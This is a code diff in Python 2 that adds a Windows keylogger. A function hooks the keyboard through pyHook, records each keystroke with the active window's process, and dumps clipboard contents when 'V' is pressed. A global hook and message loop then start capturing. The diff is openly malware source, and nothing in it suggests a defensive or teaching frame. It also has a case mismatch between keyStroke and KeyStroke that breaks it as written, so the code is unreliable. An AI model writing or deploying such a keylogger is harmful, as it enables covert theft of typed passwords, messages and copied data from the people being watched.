@@ -29,3 +29,32 @@ def getCurrentProcess():
 
     kernel32.CloseHandle(hwnd)
     kernel32.CloseHandle(hProcess)
+
+def keyStroke(event):
+    global currentWindow
+
+    if event.WindowName != currentWindow:
+        currentWindow = event.WindowName
+        getCurrentProcess()
+
+    if event.Ascii > 32 and event.Ascii < 127:
+        print chr(event.Ascii)
+    else:
+        if event.Key == "V":
+            win32clipboard.OpenClipboard()
+            pastedValue = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+
+            print "[PASTE] - %s" % (pastedValue),
+
+        else:
+
+            print "[%s]" % event.Key,
+
+    return True
+
+key = pyHook.HookManager()
+key.KeyDown = KeyStroke
+
+key.HookKeyboard()
+pythoncom.PumpMessages()
